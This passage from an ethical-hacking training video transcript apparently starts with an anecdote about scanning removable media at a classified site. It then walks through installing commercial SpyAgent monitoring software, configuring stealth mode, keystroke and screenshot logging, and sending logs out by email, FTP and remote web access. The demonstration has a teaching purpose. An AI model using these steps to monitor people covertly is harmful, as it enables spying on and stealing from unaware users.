if I've done it\nin any of these episodes, but\n\n540\n00:24:47.748 --> 00:24:50.847\nI know I've mentioned in other programs\nwe've done, the security errors.\n\n541\n00:24:50.847 --> 00:24:54.048\nI do a lot of work in government and\nmilitary installations,\n\n542\n00:24:54.048 --> 00:24:55.741\ndo a lot of training in general,\n\n543\n00:24:55.741 --> 00:24:59.830\nand certainly security work in some\nof those areas from time to time.\n\n544\n00:24:59.830 --> 00:25:04.151\nAnd so maybe, I don't know, six months\nago, a year ago, whatever the last time\n\n545\n00:25:04.151 --> 00:25:07.800\nwas that I had to do this, I was down\non one of the bases we do work for, and\n\n546\n00:25:07.800 --> 00:25:11.480\nI had to bring in, I was teaching a,\nforget what it was,\n\n547\n00:25:11.480 --> 00:25:13.830\nprobably it was\na Systems Center Config Metric class.\n\n548\n00:25:13.830 --> 00:25:17.400\nKind of like the stuff you and\nI had done to set up for ITPro TV, and\n\n549\n00:25:17.400 --> 00:25:19.252\nI had to bring in the materials.\n\n550\n00:25:19.252 --> 00:25:21.700\nYou know, like the slides and\nthe book and whatever.\n\n551\n00:25:21.700 --> 00:25:24.380\nYou're not allowed to bring\ncomputers on base where I work.\n\n552\n00:25:24.380 --> 00:25:27.490\nAt least in the secure area for\nthis particular command that I work in.\n\n553\n00:25:27.490 --> 00:25:29.330\nIt's a highly secured area.\n\n554\n00:25:29.330 --> 00:25:32.150\nThey do a lot of interdiction\nwork in various places.\n\n555\n00:25:32.150 --> 00:25:34.790\nAnd you're not allowed to bring\nany kind of gear in unless you go\n\n556\n00:25:34.790 --> 00:25:36.790\nthrough a million hoops.\n\n557\n00:25:36.790 --> 00:25:38.330\nSign off on a million documents.\n\n558\n00:25:38.330 --> 00:25:40.450\nGet somebody with a at least a star or\n\n559\n00:25:40.450 --> 00:25:43.090\nbetter on their shoulder\nto tell you it'll be okay.\n\n560\n00:25:43.090 --> 00:25:46.327\nAnd then you still have to play nice with\nthe IA people because they just still\n\n561\n00:25:46.327 --> 00:25:47.580\ndon't want to do it.\n\n562\n00:25:47.580 --> 00:25:49.700\nSo I can't bring my computer in.\n\n563\n00:25:49.700 --> 00:25:51.267\nYou train, you know.\n\n564\n00:25:51.267 --> 00:25:55.523\n[CROSSTALK] And although we've\ngone to electronic courseware, so\n\n565\n00:25:55.523 --> 00:26:00.463\nMicrosoft stuff with using Skill Pipe\nyou can pull it down from the cloud, but\n\n566\n00:26:00.463 --> 00:26:02.895\nI still had some stuff I wanted to use.\n\n567\n00:26:02.895 --> 00:26:07.135\nSo I was using the old school PDF,\nbefore we had switched over,\n\n568\n00:26:07.135 --> 00:26:08.980\nand I was using the slides.\n\n569\n00:26:08.980 --> 00:26:12.340\nI had to bring those in so I said,\nhey, how are we gonna do this?\n\n570\n00:26:12.340 --> 00:26:13.670\nYou know, I showed up with the computer.\n\n571\n00:26:13.670 --> 00:26:14.230\nAbsolutely not.\n\n572\n00:26:14.230 --> 00:26:14.970\nThat's not happening.\n\n573\n00:26:14.970 --> 00:26:16.400\nOkay.\nGo put that back in the car,\n\n574\n00:26:16.400 --> 00:26:17.540\nforget about that.\n\n575\n00:26:17.540 --> 00:26:18.270\nSo what else?\n\n576\n00:26:18.270 --> 00:26:19.940\nWell, do you have it on like a CD?\n\n577\n00:26:21.400 --> 00:26:22.970\nI said no, but\nI can copy them off the computer.\n\n578\n00:26:22.970 --> 00:26:25.490\nYou know,\nthe one you said I can't bring in.\n\n579\n00:26:25.490 --> 00:26:27.720\nGo get that one and\nI can put it on a thumb drive.\n\n580\n00:26:27.720 --> 00:26:28.964\nAnd they're all just groaning.\n\n581\n00:26:28.964 --> 00:26:31.830\nThey're like, wow,\nyou're gonna have to deal with Mary.\n\n582\n00:26:31.830 --> 00:26:33.660\nI'm like, okay, what's that?\n\n583\n00:26:33.660 --> 00:26:34.260\n>> What's Mary?\n[LAUGH]\n\n584\n00:26:34.260 --> 00:26:35.719\n>> Yeah, what's Mary.\n\n585\n00:26:35.719 --> 00:26:37.590\nMary's our IA person.\n\n586\n00:26:37.590 --> 00:26:40.210\nReally?\nThere's no other way?\n\n587\n00:26:40.210 --> 00:26:43.320\nMary's like the dragon that's\ngonna come out and eat people.\n\n588\n00:26:43.320 --> 00:26:47.060\nI said, well listen, if you want to\ndo this, it's the only way to do it.\n\n589\n00:26:47.060 --> 00:26:48.750\nSo we go back for, finally.\n\n590\n00:26:48.750 --> 00:26:49.940\nOkay, great.\nWe make the copy,\n\n591\n00:26:49.940 --> 00:26:51.285\nthe IA officer comes out.\n\n592\n00:26:51.285 --> 00:26:53.340\nMary turns out to be really nice.\n\n593\n00:26:53.340 --> 00:26:54.000\nAnd she comes out.\n\n594\n00:26:54.000 --> 00:26:55.820\nShe says, okay, listen, here's the deal.\n\n595\n00:26:55.820 --> 00:26:58.260\nYou know, these are things you gotta do.\n\n596\n00:26:58.260 --> 00:26:59.560\nI have to see where it came from.\n\n597\n00:26:59.560 --> 00:27:00.640\nWe don't have to take it.\n\n598\n00:27:00.640 --> 00:27:04.160\nYou sit here for\nlike an hour while we go into our lab,\n\n599\n00:27:04.160 --> 00:27:08.990\ntotally isolated, so\nif this thing blows up, nothing happens.\n\n600\n00:27:08.990 --> 00:27:12.300\nWe gotta run like 25 different\nscans on these files.\n\n601\n00:27:12.300 --> 00:27:13.080\n>> Yeah.\n>> Looking for\n\n602\n00:27:13.080 --> 00:27:14.530\nall these things\n>> And\n\n603\n00:27:14.530 --> 00:27:19.070\nthen when we're done, if it still is good,\nwe'll burn it onto a CD and\n\n604\n00:27:19.070 --> 00:27:22.450\nthen we'll give you the CD and\nwe're throwing away the thumb drive.\n\n605\n00:27:22.450 --> 00:27:24.025\nSo you have nothing on here you want,\nright?\n\n606\n00:27:24.025 --> 00:27:26.260\n>> Because the thumb drive is\nrewritable and you could potentially-\n\n607\n00:27:26.260 --> 00:27:28.800\n>> You can't take thumb drive in.\n\n608\n00:27:28.800 --> 00:27:30.990\n>> Yeah.\n>> And since we're using it,\n\n609\n00:27:30.990 --> 00:27:34.755\nwe're nuking it, it's going in the pile\nto go get thermited when we're done.\n\n610\n00:27:34.755 --> 00:27:35.780\n>> [LAUGH]\n>> I said, okay, that's cool,\n\n611\n00:27:35.780 --> 00:27:37.450\nI have nothing on there, it's no big deal.\n\n612\n00:27:37.450 --> 00:27:40.160\nSo they finally, about an hour later,\nbring me out the CD, right?\n\n613\n00:27:40.160 --> 00:27:42.380\nAnd they say, okay, here you go.\n\n614\n00:27:42.380 --> 00:27:43.438\nAnd it's funny.\n\n615\n00:27:43.438 --> 00:27:47.310\nSo the CD's not rewritable, so\nthey won't even hand me the CD.\n\n616\n00:27:47.310 --> 00:27:49.070\nSo, you know, you got to follow procedure.\n\n617\n00:27:49.070 --> 00:27:52.210\nSo they have to hand it to my escort\nbecause I'm not allowed to go anywhere\n\n618\n00:27:52.210 --> 00:27:56.540\nwithout my body double who's got the pass\nto actually allow me to walk around.\n\n619\n00:27:56.540 --> 00:28:01.110\nSo they gave it to my escort and they say,\nokay, here's the removable media, or\n\n620\n00:28:01.110 --> 00:28:03.280\nrather, here's the burned media.\n\n621\n00:28:03.280 --> 00:28:06.320\nAnd so and so said this is okay and\nit's signed off on.\n\n622\n00:28:06.320 --> 00:28:11.250\nAnd it's not only got all the markings\non it, they'd actually got a sticker on\n\n623\n00:28:11.250 --> 00:28:15.292\nthe top of the media that says,\nthis is who did it whatever, classified,\n\n624\n00:28:15.292 --> 00:28:16.690\nbecause I'm working in\na classified network.\n\n625\n00:28:16.690 --> 00:28:17.400\nClassified.\n\n626\n00:28:17.400 --> 00:28:21.020\nSo the media is now classified, which\nmeans I can't plug it into an unclassified\n\n627\n00:28:21.020 --> 00:28:23.720\ncomputer or the media's no longer valid.\n\n628\n00:28:23.720 --> 00:28:25.530\nEven though it's not rewritable or\nanything else.\n\n629\n00:28:25.530 --> 00:28:29.140\nI mean, this is the same kind of place\nwhere literally, mouse pads, right?\n\n630\n00:28:29.140 --> 00:28:31.020\nYou turn the mouse pad over there,\nI told you that story.\n\n631\n00:28:31.020 --> 00:28:33.890\nYou turn the mouse pad over,\nit's got the class sticker,\n\n632\n00:28:33.890 --> 00:28:35.830\nthe red classified sticker on it.\n\n633\n00:28:35.830 --> 00:28:37.810\nBecause it's part of\na system that is classified.\n\n634\n00:28:37.810 --> 00:28:38.800\n>> [LAUGH]\n>> Because you know,\n\n635\n00:28:38.800 --> 00:28:40.500\nyou have to classify mouse pads.\n\n636\n00:28:40.500 --> 00:28:41.480\n>> Absolutely.\n\n637\n00:28:41.480 --> 00:28:43.060\n>> Because mouse pads can tell secrets.\n\n638\n00:28:43.060 --> 00:28:46.280\n>> You can't have unclassified mouse pads\nsitting next to a classified system.\n\n639\n00:28:46.280 --> 00:28:48.820\n>> God forbid that should happen, right?\n\n640\n00:28:48.820 --> 00:28:53.293\nI mean just imagine the horror of that\nclassified systems family that they were\n\n641\n00:28:53.293 --> 00:28:56.855\nactually fraternizing with\nan unclassified mouse pad.\n\n642\n00:28:56.855 --> 00:28:59.310\nJust be the end of them\nsocially as we know it.\n\n643\n00:28:59.310 --> 00:29:02.356\nSo I joke around about this stuff,\nbut all kidding aside,\n\n644\n00:29:02.356 --> 00:29:04.170\nthis is how we maintain security.\n\n645\n00:29:04.170 --> 00:29:06.220\nBecause this is what has to be done.\n\n646\n00:29:06.220 --> 00:29:11.260\nThis is the level you need to go to in\nsome of these circumstances to ensure that\n\n647\n00:29:11.260 --> 00:29:13.220\nsomebody like me, who's a good actor,\n\n648\n00:29:13.220 --> 00:29:16.790\nwho's not looking to do harm, is gonna\nget treated the same way as a bad actor.\n\n649\n00:29:16.790 --> 00:29:19.940\nThe assumption is you're guilty\nuntil proven innocent, and\n\n650\n00:29:19.940 --> 00:29:24.005\nthat's okay in this circumstance because\nwe want to make sure we're not bringing\n\n651\n00:29:24.005 --> 00:29:26.285\nany media in that could be\nsteganographically modified.\n\n652\n00:29:26.285 --> 00:29:29.425\nI mean one of the checks they do\nis they run those files through\n\n653\n00:29:29.425 --> 00:29:32.125\na stego checker to ensure\nthere isn't secret data.\n\n654\n00:29:32.125 --> 00:29:36.294\nThey run them through an ADS detector\nto make sure I haven't bound, you know,\n\n655\n00:29:36.294 --> 00:29:39.894\nexecutable malware to a file that\nthey're about to let me take in and\n\n656\n00:29:39.894 --> 00:29:41.885\nput on a classified system.\n\n657\n00:29:41.885 --> 00:29:44.630\n>> Right.\n>> So this is really important stuff.\n\n658\n00:29:44.630 --> 00:29:48.240\nAnd so this is the kind of stuff that if\nyou're setting up a security perimeter,\n\n659\n00:29:48.240 --> 00:29:52.950\nas an ethical hacker, that you need to\nfigure out how to manage on behalf of your\n\n660\n00:29:52.950 --> 00:29:57.146\nclient, or on behalf of\nthe stakeholders in your organization.\n\n661\n00:29:57.146 --> 00:30:01.310\nThis is the kind of steps, these are the\nkinds of things you many need to go to.\n\n662\n00:30:01.310 --> 00:30:03.460\nLet's take a look at another piece of\nsoftware that's gonna actually help\n\n663\n00:30:03.460 --> 00:30:07.440\nus to understand what we could do remotely\nby snooping and kind of key logging,\n\n664\n00:30:07.440 --> 00:30:08.120\nall that kind of stuff.\n\n665\n00:30:08.120 --> 00:30:10.020\nHow do we spy, in other words.\n\n666\n00:30:10.020 --> 00:30:13.040\nSo we've got Spy linked,\nSpyAgent, sitting up there.\n\n667\n00:30:13.040 --> 00:30:16.450\nSo we can go, and I just went ahead and\nlaunched the installable, so\n\n668\n00:30:16.450 --> 00:30:20.550\nI had to just again, take this out\nfrom the compressed file it comes in.\n\n669\n00:30:20.550 --> 00:30:24.220\nAll I did then was explode it out\nto the desktop, create a directory,\n\n670\n00:30:24.220 --> 00:30:26.880\nwe then go ahead and\nwe're just gonna load this.\n\n671\n00:30:26.880 --> 00:30:29.267\nI figured I would actually let\nyou see this one going in, so\n\n672\n00:30:29.267 --> 00:30:30.500\nyou can just see how it works.\n\n673\n00:30:30.500 --> 00:30:33.158\nBecause a lot of times we'll\npre-load these in the demos, but\n\n674\n00:30:33.158 --> 00:30:35.280\nI figured let's just go ahead and\nlet's do that.\n\n675\n00:30:35.280 --> 00:30:38.970\nSo we'll click Next,\nWelcome to SpyAgent's SpyTech software,\n\n676\n00:30:38.970 --> 00:30:42.360\nthis program will install\nSpyAgent on your computer.\n\n677\n00:30:42.360 --> 00:30:47.030\nWillfully installing something that\nsays spy on it, just so you know.\n\n678\n00:30:47.030 --> 00:30:49.040\nNow it says here, important to know.\n\n679\n00:30:49.040 --> 00:30:52.550\nNorton Anti-Virus users, SpyAgent's\na computer monitoring product and\n\n680\n00:30:52.550 --> 00:30:55.250\nsome anti-virus solutions may\nfind that to be a problem.\n\n681\n00:30:55.250 --> 00:30:59.580\nSo it does tell us, hey, you're about to\nset up a program that is essentially gonna\n\n682\n00:30:59.580 --> 00:31:03.190\nviolate the rules and\nconstraints of your anti-virus program.\n\n683\n00:31:03.190 --> 00:31:04.770\nSo you have to be aware of that.\n\n684\n00:31:04.770 --> 00:31:06.080\nOkay, no problem, we know that.\n\n685\n00:31:06.080 --> 00:31:06.720\nWe're just gonna go ahead,\n\n686\n00:31:06.720 --> 00:31:09.840\nwe're gonna click Next,\nwe've got our little license there.\n\n687\n00:31:09.840 --> 00:31:10.730\nClick Yes.\n\n688\n00:31:10.730 --> 00:31:13.250\nThey now have the rights to\neverything they find on our machine.\n\n689\n00:31:13.250 --> 00:31:13.980\nWonderful.\n\n690\n00:31:13.980 --> 00:31:15.060\nSo we're gonna install.\n\n691\n00:31:16.590 --> 00:31:18.965\nDo we do an Administrator/Tester install?\n\n692\n00:31:18.965 --> 00:31:23.820\nWe'll install all the software options\naccessible via the Windows menu, etcetera.\n\n693\n00:31:23.820 --> 00:31:27.630\nSo essentially we're really here and\nnot stealth mode or stealth install.\n\n694\n00:31:27.630 --> 00:31:31.471\nPrograms installed with minimum required\noption shortcuts included in Windows start\n\n695\n00:31:31.471 --> 00:31:33.480\nmenu also help documents\nare not installed.\n\n696\n00:31:33.480 --> 00:31:37.415\nMeaning, you gotta get to it from the\ncommand line [CROSSTALK] know it's there.\n\n697\n00:31:37.415 --> 00:31:40.380\nSo we'll make it easy just to\nshow a little show and tell.\n\n698\n00:31:40.380 --> 00:31:42.510\nWe'll put everything in there,\nbut you get the idea.\n\n699\n00:31:42.510 --> 00:31:43.940\nThat may obviously be good.\n\n700\n00:31:43.940 --> 00:31:45.930\nWould you like to include it on installer?\n\n701\n00:31:45.930 --> 00:31:50.130\nNow this is the time where we go back to\nthat conversation we had about, hey, so\n\n702\n00:31:50.130 --> 00:31:54.140\nhow do we get rid of stuff, and\nis there malware associated with that?\n\n703\n00:31:54.140 --> 00:31:56.115\nSo you obviously want to be\ncareful with this kind of stuff.\n\n704\n00:31:56.115 --> 00:31:59.658\nWe'll say yes because we are gonna\nwant to get rid of it at some point.\n\n705\n00:31:59.658 --> 00:32:02.801\nSo we'll fix that up, we'll let\nit do it's thing here real quick.\n\n706\n00:32:02.801 --> 00:32:04.498\nPuts all of our shortcuts in there, so\n\n707\n00:32:04.498 --> 00:32:06.737\nit's just showing us where\nit's gonna put them.\n\n708\n00:32:06.737 --> 00:32:08.680\nLet's just minimize that out.\n\n709\n00:32:08.680 --> 00:32:10.930\nAll right, okay, so we've got all that.\n\n710\n00:32:13.330 --> 00:32:17.270\nThen setup is complete,\ndo you want to run the SpyAgent, right?\n\n711\n00:32:17.270 --> 00:32:20.090\nSo this is where we now actually\nare gonna start the program.\n\n712\n00:32:20.090 --> 00:32:23.000\nSo yeah, no problem, we'll do that instead\nof having to go find the shortcut and\n\n713\n00:32:23.000 --> 00:32:24.050\ndo it ourselves.\n\n714\n00:32:24.050 --> 00:32:25.470\nWe'll just go ahead and\nwe'll get that done.\n\n715\n00:32:25.470 --> 00:32:28.440\nSo we'll click Close,\nwe'll let that spin up.\n\n716\n00:32:28.440 --> 00:32:30.350\nSo hey, you can go buy this if you want.\n\n717\n00:32:30.350 --> 00:32:31.450\nThat's nice.\n\n718\n00:32:31.450 --> 00:32:32.340\nGo click continue.\n\n719\n00:32:32.340 --> 00:32:35.095\nA little first time usage help and\ntips here.\n\n720\n00:32:35.095 --> 00:32:36.815\nClick continue, right.\n\n721\n00:32:36.815 --> 00:32:40.005\nSpecify the password that is gonna\nbe used to prevent others from\n\n722\n00:32:40.005 --> 00:32:41.570\nbeing able to change your settings.\n\n723\n00:32:41.570 --> 00:32:46.105\nCuz we don't want the well meeting folk\nto come in here and mess around right.\n\n724\n00:32:46.105 --> 00:32:47.455\nSo we'll do that.\n\n725\n00:32:47.455 --> 00:32:54.950\nI'll just do\n>> I love that option.\n\n726\n00:32:54.950 --> 00:32:58.980\nI think it was Sub7 that used to let you\npassword-protect your server settings so\n\n727\n00:32:58.980 --> 00:33:02.695\nthat your victims couldn't change your\nport settings and things like that.\n\n728\n00:33:02.695 --> 00:33:04.410\n>> [LAUGH]\n>> Right before you went and\n\n729\n00:33:04.410 --> 00:33:07.830\nopened up the CD rom chair remote,\ngive them a cup holder option.\n\n730\n00:33:07.830 --> 00:33:09.170\nHey, where'd my cupholder go?\n\n731\n00:33:09.170 --> 00:33:10.860\nIt keeps coming and going.\n\n732\n00:33:10.860 --> 00:33:13.790\nSo now that I've done that,\nset the password up as you could see,\n\n733\n00:33:13.790 --> 00:33:17.870\nselect from a config package,\ncomplete itself config, complete config.\n\n734\n00:33:17.870 --> 00:33:19.210\nTypical config.\n\n735\n00:33:19.210 --> 00:33:23.860\nThis config, if we do complete end stuff,\nconfigure's set to run in\n\n736\n00:33:23.860 --> 00:33:27.110\ntotal stealth mode with all possible\nlogging options preconfigured.\n\n737\n00:33:27.110 --> 00:33:30.430\nComplete config runs with all possible\nlogging options preconfigured, but\n\n738\n00:33:30.430 --> 00:33:31.740\ndoesn't do stealth.\n\n739\n00:33:31.740 --> 00:33:34.280\nAnd then typical\nMost Commonly Used Logging Options.\n\n740\n00:33:34.280 --> 00:33:36.960\nSo we probably want to do complete, and\n\n741\n00:33:36.960 --> 00:33:40.380\nthat way we can just see and\ninteract a little bit so we will do that.\n\n742\n00:33:40.380 --> 00:33:42.580\nSend logs, how are we going to send logs?\n\n743\n00:33:42.580 --> 00:33:46.360\nBy email to ourselves,\ndisplay alert on startup.\n\n744\n00:33:46.360 --> 00:33:48.890\nLoad on Windows startup, so\nwe wanna have this thing running, right?\n\n745\n00:33:48.890 --> 00:33:50.420\nMake sure we know it's there.\n\n746\n00:33:50.420 --> 00:33:52.310\nHow are we gonna get the logs out?\n\n747\n00:33:52.310 --> 00:33:56.210\nWe can do that, we could then\nspecify an email address, right?\n\n748\n00:33:56.210 --> 00:34:01.560\nSo send logs via email, send it to, so\nwe put in our email address, right?\n\n749\n00:34:01.560 --> 00:34:04.580\nSo mike@itpro.tv.\n\n750\n00:34:04.580 --> 00:34:06.075\nMike will get our logs, right?\n\n751\n00:34:06.075 --> 00:34:07.370\n>> Mm-hm.\n\n752\n00:34:07.370 --> 00:34:08.550\n>> And then we get a little mail.\n\n753\n00:34:08.550 --> 00:34:09.720\nSubject line there.\n\n754\n00:34:09.720 --> 00:34:11.940\nSo we can personalize that.\n\n755\n00:34:11.940 --> 00:34:14.140\nHow often are we batching those logs.\n\n756\n00:34:14.140 --> 00:34:15.080\n>> Right.\nEvery 30 minutes or\n\n757\n00:34:15.080 --> 00:34:16.180\nwhatever we're gonna do.\n\n758\n00:34:16.180 --> 00:34:21.430\nSend every, you know, day so\nwe can set it up HTML format, TXT format.\n\n759\n00:34:21.430 --> 00:34:22.960\nWhat log do we want?\n\n760\n00:34:22.960 --> 00:34:24.800\nDo we want the keystroke log?\n\n761\n00:34:24.800 --> 00:34:27.600\nDo we want to format\nthe keystrokes before sending?\n\n762\n00:34:27.600 --> 00:34:29.500\nTidy them up, make them look nice.\n\n763\n00:34:29.500 --> 00:34:33.935\nSend window log, send connection log\nactions and events, computer usage.\n\n764\n00:34:33.935 --> 00:34:37.170\nSnapshot of current desktop so\nwe can see what's going on.\n\n765\n00:34:37.170 --> 00:34:38.370\nThat's always good.\n\n766\n00:34:38.370 --> 00:34:41.140\nClear all logs after sending,\nthat's always important.\n\n767\n00:34:41.140 --> 00:34:41.940\nDo that one.\n\n768\n00:34:41.940 --> 00:34:43.740\nWe've got the websites visited.\n\n769\n00:34:43.740 --> 00:34:47.090\nSend the website usage app log for\napps ran.\n\n770\n00:34:47.090 --> 00:34:50.410\nApplication usage and\nthe document and print log.\n\n771\n00:34:50.410 --> 00:34:53.350\nNow we can perform a little e-mail\ndelivery test so we can do that.\n\n772\n00:34:54.770 --> 00:34:57.232\nTest e-mail delivery will now start,\nplease wait.\n\n773\n00:34:59.443 --> 00:35:02.550\nOkay so we'll do that, response from host.\n\n774\n00:35:02.550 --> 00:35:06.447\nResponse is correct and error-free,\nmeaning I should be able to go out and\n\n775\n00:35:06.447 --> 00:35:10.822\nget out and you shouldn't get\na whole bunch of spam in your inbox.\n\n776\n00:35:10.822 --> 00:35:14.710\n>> [LAUGH]\n>> We did get that, that's good.\n\n777\n00:35:14.710 --> 00:35:17.200\nAuthentication succeeded, good.\n\n778\n00:35:17.200 --> 00:35:18.975\nResponse from host, okay.\n\n779\n00:35:18.975 --> 00:35:19.475\nOkay.\n\n780\n00:35:20.718 --> 00:35:21.856\nOkay.\n\n781\n00:35:21.856 --> 00:35:26.440\nAnd look, queued up for delivery,\nemail delivery completed.\n\n782\n00:35:26.440 --> 00:35:29.427\nSo Mike should, every thirty minutes now-\n>> [LAUGH]\n\n783\n00:35:29.427 --> 00:35:30.450\n>> Be getting slammed.\n\n784\n00:35:30.450 --> 00:35:32.307\nYour pockets are gonna blow up here.\n\n785\n00:35:32.307 --> 00:35:36.160\n[LAUGH] Microsoft's gonna send them\na nasty what the hell are you doing email\n\n786\n00:35:36.160 --> 00:35:37.160\nhere pretty quickly.\n\n787\n00:35:37.160 --> 00:35:39.300\nRight, so we have that, and so\n\n788\n00:35:39.300 --> 00:35:42.350\nwe can start peppering Mike with\nall sorts of unwanted spam.\n\n789\n00:35:42.350 --> 00:35:45.430\nNow we could also upload logs via FTP,\nright?\n\n790\n00:35:45.430 --> 00:35:48.110\nSo we can actually stealth\nthe logs out through an FTP.\n\n791\n00:35:48.110 --> 00:35:50.090\nNow remember, for port scanning, right?\n\n792\n00:35:50.090 --> 00:35:52.660\nAnd we're looking and\nsaying hey why are we are running that?\n\n793\n00:35:52.660 --> 00:35:55.820\nShould we be running FTP\nnormally on a workstation?\n\n794\n00:35:55.820 --> 00:35:57.160\nI'm thinking probably not.\n\n795\n00:35:57.160 --> 00:35:57.780\n>> Probably not.\n\n796\n00:35:57.780 --> 00:36:00.430\n>> So if we do a scan on the border and\n\n797\n00:36:00.430 --> 00:36:04.160\nwe start seeing FTP traffic outbound, I'm\ngonna wanna know where that's coming from.\n\n798\n00:36:04.160 --> 00:36:04.660\n>> Yeah.\n>> Right?\n\n799\n00:36:04.660 --> 00:36:06.690\nSo but I could FTP this stuff up.\n\n800\n00:36:06.690 --> 00:36:08.220\nSame options again.\n\n801\n00:36:08.220 --> 00:36:09.530\nI can see here.\n\n802\n00:36:09.530 --> 00:36:10.920\nYou'll see it with spyware.\n\n803\n00:36:10.920 --> 00:36:12.080\nWith SpyAnywhere, excuse me,\n\n804\n00:36:12.080 --> 00:36:16.360\nyou can view SpyAgent's logs from\na remote location via your web browser.\n\n805\n00:36:16.360 --> 00:36:16.950\nRight?\nSo if I do\n\n806\n00:36:16.950 --> 00:36:18.090\nSpyAnywhere\n>> Wow.\n\n807\n00:36:18.090 --> 00:36:19.110\n>> I can actually download that,\n\n808\n00:36:19.110 --> 00:36:22.340\nmake them available via the web and\nsend through a remote listener agent.\n\n809\n00:36:22.340 --> 00:36:25.240\n>> Wow.\n>> So I can just go in via the web and\n\n810\n00:36:25.240 --> 00:36:28.320\nI can, I don't even have to get\nMike to log in email anymore.\n\n811\n00:36:28.320 --> 00:36:30.200\nWe're gonna leave that there just-\n>> [LAUGH]\n\n812\n00:36:30.200 --> 00:36:31.234\n>> So it pisses Mike off, but\n\n813\n00:36:31.234 --> 00:36:32.649\nwe don't actually have to do that.\n\n814\n00:36:32.649 --> 00:36:35.000\nAnd I told Mike before we\ndid that part of the demo.\n\n815\n00:36:35.000 --> 00:36:36.500\nMike would have been like great,\ndon't send me email.\n\n816\n00:36:36.500 --> 00:36:38.810\n>> [LAUGH]\n>> But I could do this via the web.\n\n817\n00:36:38.810 --> 00:36:41.468\nSo I could be sitting anywhere.\n\n818\n00:36:41.468 --> 00:36:43.142\n>> [CROSSTALK]\n>> Yeah.\n\n819\n00:36:43.142 --> 00:36:45.650\nAnd go check the log files on\nsome machine you've compromised.\n\n820\n00:36:45.650 --> 00:36:46.470\n>> I have.\n\n821\n00:36:46.470 --> 00:36:47.745\nAs a matter of fact, your machine.\n\n822\n00:36:47.745 --> 00:36:49.270\n>> [LAUGH]\n>> It is, as a matter of fact.\n\n823\n00:36:49.270 --> 00:36:50.710\nAnd by the way-\n>> I wondered why you wanted to\n\n824\n00:36:50.710 --> 00:36:51.405\nswitch PCs.\n\n825\n00:36:51.405 --> 00:36:53.313\n>> [CROSSTALK]\n>> I'm using your machine right now,\n\n826\n00:36:53.313 --> 00:36:54.340\njust to be clear.\n\n827\n00:36:54.340 --> 00:36:55.220\n>> Now I know.\n\n828\n00:36:55.220 --> 00:36:59.940\n>> But I've actually done this for\nclients with pen tests that we've done.\n\n829\n00:36:59.940 --> 00:37:02.390\nAnd I've actually done it,\nset this up, done the whole thing.\n\n830\n00:37:02.390 --> 00:37:05.093\nAnd I can log in from my Blackberry\nusing my secure Alpha browser, and\n\n831\n00:37:05.093 --> 00:37:06.800\nI can actually just go hit these machines.\n\n832\n00:37:06.800 --> 00:37:07.580\n>> Really wow.\n\n833\n00:37:07.580 --> 00:37:12.630\n>> So I could just sit there while I'm\nhaving my you know, Doppio Espresso\n\n834\n00:37:12.630 --> 00:37:15.640\nin the line because Lord knows I have time\nwhile I'm waiting in the drive thru and\n\n835\n00:37:15.640 --> 00:37:18.980\nI can actually check in on my machines and\nsee what's cooking and\n\n836\n00:37:18.980 --> 00:37:19.800\ndo all sorts of stuff.\n\n837\n00:37:19.800 --> 00:37:23.130\nSo I got that and\nthen I can enable cloud access.\n\n838\n00:37:23.130 --> 00:37:27.010\nWhere I can actually go up and\nI can remotely change the SpyAgent log and\n\n839\n00:37:27.010 --> 00:37:29.000\nprogram options right from there.\n\n840\n00:37:29.000 --> 00:37:30.060\n>> Wow.\n>> Right so\n\n841\n00:37:30.060 --> 00:37:32.010\nI can actually do that\nover the cloud as well.\n\n842\n00:37:32.010 --> 00:37:34.430\nSo got some cool options in here right.\n\n843\n00:37:34.430 --> 00:37:37.410\nI have to set up a SpyAgent cloud\naccount which means I've gotta\n\n844\n00:37:37.410 --> 00:37:40.730\nregister with their service, spend\na little bit of money if I'm gonna do this\n\n845\n00:37:40.730 --> 00:37:44.530\nreligiously on a bunch of machines, you\nprobably want to invest the time, right?\n\n846\n00:37:44.530 --> 00:37:49.530\nSo i've go that set up, we've got\nall that, so we will go ahead and\n\n847\n00:37:49.530 --> 00:37:53.830\nclick OK, display alert, we will just\nlight it up so you can see everything.\n\n848\n00:37:53.830 --> 00:37:55.750\nMake sure it loads up there.\n\n849\n00:37:55.750 --> 00:37:59.390\nThen are you sure you want to continue\nyour configuration, so click Next.\n\n850\n00:37:59.390 --> 00:38:02.190\nSo, when I do that,\nit's then gonna actually get going.\n\n851\n00:38:02.190 --> 00:38:05.460\nSo, we'll click Next, configurations\napplied, right, click Finish.\n\n852\n00:38:05.460 --> 00:38:06.610\nGreat, okay.\n\n853\n00:38:06.610 --> 00:38:08.790\nSo now, we've got that running, okay?\n\n854\n00:38:08.790 --> 00:38:11.280\nSo, would you like to view\na little help documentation?\n\n855\n00:38:11.280 --> 00:38:14.740\nNot right now, we'll take a look at\nsome point, not too worried about that.\n\n856\n00:38:14.740 --> 00:38:19.160\nBut you can see here I've got\nthis nice little tic-tac-toe\n\n857\n00:38:19.160 --> 00:38:21.010\nboard kinda look and feel.\n\n858\n00:38:21.010 --> 00:38:25.840\nI could see keyboard and\nmouse sessions, screenshots, webcams,\n\n859\n00:38:25.840 --> 00:38:27.960\nyou name it,\nanything that's going on there.\n\n860\n00:38:27.960 --> 00:38:32.790\nSo if i click start monitoring,\nenter the password.\n\n861\n00:38:32.790 --> 00:38:35.120\nPass1234, click OK.\n\n862\n00:38:35.120 --> 00:38:36.450\nSo I'm monitoring.\n\n863\n00:38:36.450 --> 00:38:38.070\nNow you'll there it pops up.\n\n864\n00:38:38.070 --> 00:38:39.640\nIt's now monitoring our computer.\n\n865\n00:38:39.640 --> 00:38:43.750\nTo stop monitoring,\npress the hotkey, which by default,\n\n866\n00:38:43.750 --> 00:38:46.090\nis the CTRL+ALT+ Shift+M.\n\n867\n00:38:46.090 --> 00:38:46.620\nRight?\n\n868\n00:38:46.620 --> 00:38:48.610\nWhich of course,\nwill probably not work on this,\n\n869\n00:38:48.610 --> 00:38:52.290\nwhat we call fakakta machine in Yiddish.\n\n870\n00:38:52.290 --> 00:38:54.810\nThe Control and Alt and Shift.\n\n871\n00:38:54.810 --> 00:38:58.090\nSo CTRL+ALT+SHIFT, right?\n\n872\n00:38:58.090 --> 00:39:02.590\nPlus M, so that way we know later\nwhat [LAUGH] turn it back on.\n\n873\n00:39:02.590 --> 00:39:05.710\n>> Actually get rid of it so\nyou could actually get real, you know.\n\n874\n00:39:05.710 --> 00:39:07.260\nRight.\nso yo got that, and\n\n875\n00:39:07.260 --> 00:39:08.860\nnow we enter the password, right?\n\n876\n00:39:08.860 --> 00:39:10.100\nSo we've got that, that's 